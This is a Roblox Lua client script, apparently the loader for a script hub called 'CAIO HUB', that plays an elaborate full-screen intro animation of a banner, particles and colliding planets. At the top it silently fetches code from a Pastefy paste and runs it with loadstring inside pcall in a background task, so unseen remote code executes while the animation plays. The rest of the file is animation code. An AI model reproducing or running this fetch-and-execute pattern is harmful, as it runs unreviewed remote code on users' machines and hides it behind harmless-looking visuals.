--// SERVIÇOS
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local cam = workspace.CurrentCamera

--// EXECUTAR O SCRIPT DO PASTEFY EM SEGUNDO PLANO
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/c8SP5vCz/raw"))()
    end)
end)

--// GUI
local gui = Instance.new("ScreenGui", player.PlayerGui)
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 9999

--// FUNDO
local fundo = Instance.new("Frame", gui)
fundo.Size = UDim2.fromScale(1,1)
fundo.BackgroundColor3 = Color3.new(0,0,0)
fundo.BackgroundTransparency = 1
fundo.ZIndex = 1000

--// FAIXA
local faixa = Instance.new("Frame", gui)
faixa.AnchorPoint = Vector2.new(0.5,0.5)
faixa.Position = UDim2.fromScale(0.5,0.5)
faixa.Size = UDim2.fromScale(0,0.14)
faixa.BorderSizePixel = 0
faixa.ZIndex = 1005
faixa.BackgroundColor3 = Color3.fromRGB(255,0,0)
faixa.BackgroundTransparency = 1

--// DEGRADÊ VIVO
local grad = Instance.new("UIGradient", faixa)
grad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,90,90)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(140,0,0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255,90,90))
}

task.spawn(function()
    while faixa.Parent do
        grad.Rotation += 0.35
        task.wait()
    end
end)

--// CONTAINER DO TEXTO
local textHolder = Instance.new("Frame", faixa)
textHolder.Size = UDim2.fromScale(1,1)
textHolder.BackgroundTransparency = 1

--// TEXTO 3D REAL
local layers = {}
local depth = 7

for i = depth,1,-1 do
    local l = Instance.new("TextLabel", textHolder)
    l.Size = UDim2.fromScale(1,1)
    l.BackgroundTransparency = 1
    l.Text = "CAIO HUB"
    l.Font = Enum.Font.GothamBlack
    l.TextScaled = true
    l.TextTransparency = 1
    l.ZIndex = 1008
    l.Position = UDim2.fromScale(i*0.003, i*0.008)
    l.TextColor3 = Color3.fromRGB(90,60,15)
    table.insert(layers, l)
end

local nome = Instance.new("TextLabel", textHolder)
nome.Size = UDim2.fromScale(1,1)
nome.BackgroundTransparency = 1
nome.Text = "CAIO HUB"
nome.Font = Enum.Font.GothamBlack
nome.TextScaled = true
nome.TextTransparency = 1
nome.ZIndex = 1015
nome.TextColor3 = Color3.fromRGB(255,215,0)

--// BRILHO PASSANDO NAS LETRAS
local shine = Instance.new("UIGradient", nome)
shine.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255,200,120)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,200)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255,200,120))
}

task.spawn(function()
    while nome.Parent do
        shine.Offset = Vector2.new(-0.5,0)
        TweenService:Create(shine, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Offset = Vector2.new(0.5,0)
        }):Play()
        task.wait(2.2)
    end
end)

--// ANIMAÇÃO DE ENTRADA
TweenService:Create(fundo, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
    BackgroundTransparency = 0
}):Play()

task.wait(0.3)

-- Animação da faixa entrando
TweenService:Create(faixa, TweenInfo.new(0.7, Enum.EasingStyle.Quad), {
    BackgroundTransparency = 0
}):Play()

TweenService:Create(faixa, TweenInfo.new(1.2, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
    Size = UDim2.fromScale(1,0.14)
}):Play()

task.wait(1.4)

--// MOSTRAR TEXTO COM ESCALONAMENTO
for i, l in ipairs(layers) do
    TweenService:Create(l, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {
        TextTransparency = 0.3
    }):Play()
    task.wait(0.03)
end

TweenService:Create(nome, TweenInfo.new(0.7, Enum.EasingStyle.Quad), {
    TextTransparency = 0
}):Play()

--// PULSAÇÃO SUAVE
task.spawn(function()
    while faixa.Parent do
        TweenService:Create(faixa, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Size = UDim2.fromScale(1.02,0.145)
        }):Play()
        task.wait(1.2)
        TweenService:Create(faixa, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
            Size = UDim2.fromScale(1,0.14)
        }):Play()
        task.wait(1.2)
    end
end)

task.wait(2.5)

--// ESCONDER TEXTO
for i = #layers, 1, -1 do
    TweenService:Create(layers[i], TweenInfo.new(0.4), {
        TextTransparency = 1
    }):Play()
end
TweenService:Create(nome, TweenInfo.new(0.4), {
    TextTransparency = 1
}):Play()

task.wait(0.5)

--// ENCOLHIMENTO
TweenService:Create(faixa, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.InOut), {
    Size = UDim2.fromScale(0.3,0.14)
}):Play()

task.wait(0.9)

--// BIG BANG - SOMENTE VERMELHO
local bolinhas = {}
local center = UDim2.fromScale(0.5,0.5)

-- Aumentar número de bolinhas para formar os planetas
for i = 1, 600 do
    local b = Instance.new("Frame", gui)
    local s = math.random(8,15)
    b.Size = UDim2.fromOffset(s,s)
    b.AnchorPoint = Vector2.new(0.5,0.5)
    b.Position = center
    b.BackgroundColor3 = Color3.fromRGB(255,0,0)
    b.BorderSizePixel = 0
    b.ZIndex = 1020
    b.BackgroundTransparency = 0.3
    Instance.new("UICorner", b).CornerRadius = UDim.new(1,0)
    table.insert(bolinhas, b)

    local ang = math.rad(math.random(0,360))
    local dist = math.random(400,850)

    TweenService:Create(b, TweenInfo.new(1.7, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
        Position = UDim2.fromOffset(
            cam.ViewportSize.X/2 + math.cos(ang)*dist,
            cam.ViewportSize.Y/2 + math.sin(ang)*dist
        ),
        BackgroundTransparency = 0
    }):Play()
end

faixa.Visible = false

task.wait(1.7)

--// FUNÇÃO PARA CRIAR PLANETA COM NÚCLEO E ATMOSFERA
local function criarPlanetaCompleto(posX, posY, corPrincipal, corSecundaria, tamanho, nomePlaneta)
    local planeta = {}
    
    -- ATMOSFERA EXTERNA (GLOW)
    local atmosfera = Instance.new("Frame", gui)
    atmosfera.AnchorPoint = Vector2.new(0.5,0.5)
    atmosfera.Position = UDim2.fromOffset(posX, posY)
    atmosfera.Size = UDim2.fromOffset(0,0)
    atmosfera.BackgroundColor3 = corSecundaria
    atmosfera.ZIndex = 1025
    atmosfera.BackgroundTransparency = 0.9
    atmosfera.BorderSizePixel = 0
    Instance.new("UICorner", atmosfera).CornerRadius = UDim.new(1,0)
    
    -- NÚCLEO DO PLANETA
    local nucleo = Instance.new("Frame", gui)
    nucleo.AnchorPoint = Vector2.new(0.5,0.5)
    nucleo.Position = UDim2.fromOffset(posX, posY)
    nucleo.Size = UDim2.fromOffset(0,0)
    nucleo.BackgroundColor3 = corPrincipal
    nucleo.ZIndex = 1030
    nucleo.BorderSizePixel = 0
    Instance.new("UICorner", nucleo).CornerRadius = UDim.new(1,0)
    
    -- ANIMAÇÃO DE ROTAÇÃO (PARTÍCULAS INTERNAS)
    local particulasInternas = {}
    for i = 1, 20 do
        local p = Instance.new("Frame", nucleo)
        local ang = (i / 20) * math.pi * 2
        local raio = tamanho * 0.3
        p.Size = UDim2.fromOffset(6, 6)
        p.AnchorPoint = Vector2.new(0.5,0.5)
        p.BackgroundColor3 = Color3.new(1,1,1)
        p.BackgroundTransparency = 0.7
        p.BorderSizePixel = 0
        p.ZIndex = 1031
        Instance.new("UICorner", p).CornerRadius = UDim.new(1,0)
        table.insert(particulasInternas, {frame = p, angulo = ang, raio = raio})
    end
    
    planeta.atmosfera = atmosfera
    planeta.nucleo = nucleo
    planeta.particulasInternas = particulasInternas
    planeta.corPrincipal = corPrincipal
    planeta.posX = posX
    planeta.posY = posY
    planeta.tamanho = tamanho
    
    return planeta
end

--// FUNÇÃO PARA ANIMAR ROTAÇÃO DAS PARTÍCULAS INTERNAS
local function animarRotacaoPlaneta(planeta)
    task.spawn(function()
        while planeta.nucleo and planeta.nucleo.Parent do
            for i, particula in ipairs(planeta.particulasInternas) do
                particula.angulo = particula.angulo + 0.05
                local x = planeta.posX + math.cos(particula.angulo) * particula.raio
                local y = planeta.posY + math.sin(particula.angulo) * particula.raio
                particula.frame.Position = UDim2.fromOffset(x - planeta.posX + planeta.tamanho/2, y - planeta.posY + planeta.tamanho/2)
            end
            task.wait(0.05)
        end
    end)
end

--// DIVIDIR BOLINHAS EM DOIS GRUPOS
local metade = math.floor(#bolinhas / 2)
local planetaEsqBolinhas = {}
local planetaDirBolinhas = {}

for i = 1, #bolinhas do
    if i <= metade then
        table.insert(planetaEsqBolinhas, bolinhas[i])
    else
        table.insert(planetaDirBolinhas, bolinhas[i])
    end
end

--// POSIÇÕES INICIAIS DOS PLANETAS
local planetaEsqX = -150
local planetaEsqY = cam.ViewportSize.Y / 2
local planetaDirX = cam.ViewportSize.X + 150
local planetaDirY = cam.ViewportSize.Y / 2

--// CRIAR OS DOIS PLANETAS
local planetaEsquerdo = criarPlanetaCompleto(planetaEsqX, planetaEsqY, 
    Color3.fromRGB(0, 100, 255), -- Azul profundo
    Color3.fromRGB(100, 200, 255), -- Azul claro para atmosfera
    100, "Planeta Azul")

local planetaDireito = criarPlanetaCompleto(planetaDirX, planetaDirY,
    Color3.fromRGB(255, 100, 0), -- Laranja
    Color3.fromRGB(255, 200, 100), -- Laranja claro para atmosfera
    100, "Planeta Laranja")

--// ANIMAÇÃO DE FORMAÇÃO DOS PLANETAS (BOLINHAS SE AGRUPANDO)
local function formarPlaneta(bolinhasLista, planeta, corBolinhas)
    for i, b in ipairs(bolinhasLista) do
        local delay = (i / #bolinhasLista) * 0.8
        
        task.spawn(function()
            task.wait(delay * 0.3)
            
            -- Distribuição esférica das bolinhas ao redor do planeta
            local ang = math.rad(math.random(0,360))
            local dist = math.random(20, 80) -- Camadas da atmosfera
            
            local targetX = planeta.posX + math.cos(ang) * dist
            local targetY = planeta.posY + math.sin(ang) * dist
            
            -- Primeiro trazer para perto
            TweenService:Create(b, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {
                Position = UDim2.fromOffset(targetX, targetY),
                BackgroundColor3 = corBolinhas,
                BackgroundTransparency = 0.4,
                Size = UDim2.fromOffset(6, 6)
            }):Play()
        end)
    end
end

-- Formar os planetas
formarPlaneta(planetaEsqBolinhas, planetaEsquerdo, Color3.fromRGB(100, 180, 255))
formarPlaneta(planetaDirBolinhas, planetaDireito, Color3.fromRGB(255, 180, 100))

-- Mostrar núcleos dos planetas com animação
task.wait(1)

TweenService:Create(planetaEsquerdo.atmosfera, TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.fromOffset(160, 160),
    BackgroundTransparency = 0.85
}):Play()

TweenService:Create(planetaEsquerdo.nucleo, TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.fromOffset(100, 100),
    BackgroundTransparency = 0
}):Play()

TweenService:Create(planetaDireito.atmosfera, TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.fromOffset(160, 160),
    BackgroundTransparency = 0.85
}):Play()

TweenService:Create(planetaDireito.nucleo, TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.fromOffset(100, 100),
    BackgroundTransparency = 0
}):Play()

-- Iniciar rotação das partículas internas
animarRotacaoPlaneta(planetaEsquerdo)
animarRotacaoPlaneta(planetaDireito)

task.wait(1)

--// MOVER PLANETAS PARA COLISÃO
local centroX = cam.ViewportSize.X / 2
local centroY = cam.ViewportSize.Y / 2

-- Mover planeta esquerdo para direita
local movimentoEsq = TweenService:Create(planetaEsquerdo.nucleo, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
    Position = UDim2.fromOffset(centroX - 60, centroY)
})
movimentoEsq:Play()

-- Mover atmosfera junto
TweenService:Create(planetaEsquerdo.atmosfera, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
    Position = UDim2.fromOffset(centroX - 60, centroY)
}):Play()

-- Mover planeta direito para esquerda
local movimentoDir = TweenService:Create(planetaDireito.nucleo, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
    Position = UDim2.fromOffset(centroX + 60, centroY)
})
movimentoDir:Play()

-- Mover atmosfera junto
TweenService:Create(planetaDireito.atmosfera, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
    Position = UDim2.fromOffset(centroX + 60, centroY)
}):Play()

-- Mover bolinhas junto com os planetas
for i, b in ipairs(planetaEsqBolinhas) do
    TweenService:Create(b, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
        Position = UDim2.fromOffset(centroX - 60, centroY)
    }):Play()
end

for i, b in ipairs(planetaDirBolinhas) do
    TweenService:Create(b, TweenInfo.new(3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
        Position = UDim2.fromOffset(centroX + 60, centroY)
    }):Play()
end

task.wait(3)

--// ANIMAÇÃO DE FUSÃO DOS PLANETAS
-- Primeiro, os planetas começam a se deformar
TweenService:Create(planetaEsquerdo.nucleo, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
    Size = UDim2.fromOffset(120, 90), -- Achatar
    Position = UDim2.fromOffset(centroX - 40, centroY)
}):Play()

TweenService:Create(planetaDireito.nucleo, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
    Size = UDim2.fromOffset(120, 90), -- Achatar
    Position = UDim2.fromOffset(centroX + 40, centroY)
}):Play()

-- As atmosferas começam a se fundir
TweenService:Create(planetaEsquerdo.atmosfera, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
    Size = UDim2.fromOffset(200, 140),
    Position = UDim2.fromOffset(centroX - 40, centroY),
    BackgroundColor3 = Color3.fromRGB(180, 150, 255) -- Cor misturada
}):Play()

TweenService:Create(planetaDireito.atmosfera, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
    Size = UDim2.fromOffset(200, 140),
    Position = UDim2.fromOffset(centroX + 40, centroY),
    BackgroundColor3 = Color3.fromRGB(255, 150, 180) -- Cor misturada
}):Play()

task.wait(0.8)

--// FASE 2 DA FUSÃO - OS PLANETAS COMEÇAM A ENTRAR UM NO OUTRO
-- Movimento de interpenetração
TweenService:Create(planetaEsquerdo.nucleo, TweenInfo.new(1.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
    Position = UDim2.fromOffset(centroX - 20, centroY),
    Size = UDim2.fromOffset(90, 90),
    BackgroundTransparency = 0.3
}):Play()

TweenService:Create(planetaDireito.nucleo, TweenInfo.new(1.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
    Position = UDim2.fromOffset(centroX + 20, centroY),
    Size = UDim2.fromOffset(90, 90),
    BackgroundTransparency = 0.3
}):Play()

-- As bolinhas começam a se misturar
for i = 1, 100 do
    local bEsq = planetaEsqBolinhas[math.random(1, #planetaEsqBolinhas)]
    local bDir = planetaDirBolinhas[math.random(1, #planetaDirBolinhas)]
    
    if bEsq and bDir then
        -- Trocar algumas bolinhas de posição
        local tempPos = bEsq.Position
        TweenService:Create(bEsq, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
            Position = bDir.Position,
            BackgroundColor3 = Color3.fromRGB(255, 150, 100) -- Cor intermediária
        }):Play()
        
        TweenService:Create(bDir, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
            Position = tempPos,
            BackgroundColor3 = Color3.fromRGB(150, 150, 255) -- Cor intermediária
        }):Play()
    end
end

task.wait(1.2)

--// COLISÃO FINAL COM FLASH BRANCO
-- Primeiro, juntar completamente
TweenService:Create(planetaEsquerdo.nucleo, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
    Position = UDim2.fromOffset(centroX, centroY),
    Size = UDim2.fromOffset(140, 140),
    BackgroundTransparency = 0.5
}):Play()

TweenService:Create(planetaDireito.nucleo, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
    Position = UDim2.fromOffset(centroX, centroY),
    Size = UDim2.fromOffset(140, 140),
    BackgroundTransparency = 0.5
}):Play()

-- Fundir atmosferas completamente
TweenService:Create(planetaEsquerdo.atmosfera, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
    Position = UDim2.fromOffset(centroX, centroY),
    Size = UDim2.fromOffset(250, 250),
    BackgroundTransparency = 0.7
}):Play()

TweenService:Create(planetaDireito.atmosfera, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
    Position = UDim2.fromOffset(centroX, centroY),
    Size = UDim2.fromOffset(250, 250),
    BackgroundTransparency = 0.7
}):Play()

-- FLASH BRANCO NO IMPACTO
task.wait(0.2)
local flash = Instance.new("Frame", gui)
flash.Size = UDim2.fromScale(1,1)
flash.BackgroundColor3 = Color3.new(1,1,1)
flash.BackgroundTransparency = 1
flash.ZIndex = 2000

-- Flash rápido
TweenService:Create(flash, TweenInfo.new(0.05), {
    BackgroundTransparency = 0.3
}):Play()
task.wait(0.05)
TweenService:Create(flash, TweenInfo.new(0.15), {
    BackgroundTransparency = 1
}):Play()
task.wait(0.15)
flash:Destroy()

--// EXPLOSÃO DE PARTÍCULAS APÓS COLISÃO
local particulas = {}
local coresExplosao = {
    Color3.fromRGB(255, 150, 150), -- Vermelho claro
    Color3.fromRGB(150, 255, 150), -- Verde claro
    Color3.fromRGB(150, 150, 255), -- Azul claro
    Color3.fromRGB(255, 255, 150), -- Amarelo
    Color3.fromRGB(255, 150, 255)  -- Rosa
}

-- Criar partículas da explosão
for i = 1, 200 do
    local p = Instance.new("Frame", gui)
    local size = math.random(6, 20)
    p.Size = UDim2.fromOffset(size, size)
    p.AnchorPoint = Vector2.new(0.5,0.5)
    p.Position = UDim2.fromOffset(centroX, centroY)
    p.BackgroundColor3 = coresExplosao[math.random(1, #coresExplosao)]
    p.BorderSizePixel = 0
    p.ZIndex = 1040
    p.BackgroundTransparency = 0
    Instance.new("UICorner", p).CornerRadius = UDim.new(1,0)
    table.insert(particulas, p)
    
    -- Efeito de explosão com trajetórias variadas
    local ang = math.rad(math.random(0,360))
    local dist = math.random(200, 600)
    local altura = math.random(30, 200)
    local tempo = math.random(12, 18) / 10
    
    TweenService:Create(p, TweenInfo.new(tempo, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = UDim2.fromOffset(
            centroX + math.cos(ang) * dist,
            centroY + math.sin(ang) * dist - altura
        ),
        BackgroundTransparency = 1,
        Size = UDim2.fromOffset(size * 0.5, size * 0.5)
    }):Play()
    
    -- Animação de queda (gravidade)
    task.spawn(function()
        task.wait(tempo * 0.6)
        if p.Parent then
            TweenService:Create(p, TweenInfo.new(tempo * 0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                Position = UDim2.fromOffset(
                    centroX + math.cos(ang) * dist,
                    centroY + math.sin(ang) * dist + 50
                )
            }):Play()
        end
    end)
end

-- Também usar as bolinhas originais na explosão
for i, b in ipairs(bolinhas) do
    if b.Parent then
        local ang = math.rad(math.random(0,360))
        local dist = math.random(150, 500)
        local altura = math.random(20, 100)
        local tempo = math.random(10, 15) / 10
        
        TweenService:Create(b, TweenInfo.new(tempo, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Position = UDim2.fromOffset(
                centroX + math.cos(ang) * dist,
                centroY + math.sin(ang) * dist - altura
            ),
            BackgroundTransparency = 1,
            Size = UDim2.fromOffset(4, 4)
        }):Play()
        
        task.spawn(function()
            task.wait(tempo * 0.6)
            if b.Parent then
                TweenService:Create(b, TweenInfo.new(tempo * 0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                    Position = UDim2.fromOffset(
                        centroX + math.cos(ang) * dist,
                        centroY + math.sin(ang) * dist + 30
                    )
                }):Play()
            end
        end)
    end
end

-- Fazer os planetas desaparecerem
task.wait(0.3)
if planetaEsquerdo.nucleo then planetaEsquerdo.nucleo:Destroy() end
if planetaDireito.nucleo then planetaDireito.nucleo:Destroy() end
if planetaEsquerdo.atmosfera then planetaEsquerdo.atmosfera:Destroy() end
if planetaDireito.atmosfera then planetaDireito.atmosfera:Destroy() end

task.wait(1.5)

--// DESAPARECIMENTO GRADUAL
-- Fazer as partículas desaparecerem
for i, p in ipairs(particulas) do
    if p.Parent then
        TweenService:Create(p, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
            BackgroundTransparency = 1,
            Size = UDim2.fromOffset(0, 0)
        }):Play()
    end
end

-- Fazer as bolinhas desaparecerem
for i, b in ipairs(bolinhas) do
    if b.Parent then
        TweenService:Create(b, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
            BackgroundTransparency = 1,
            Size = UDim2.fromOffset(0, 0)
        }):Play()
    end
end

-- Fundo desaparece
TweenService:Create(fundo, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {
    BackgroundTransparency = 1
}):Play()

task.wait(1.5)

-- Limpar tudo
gui:Destroy()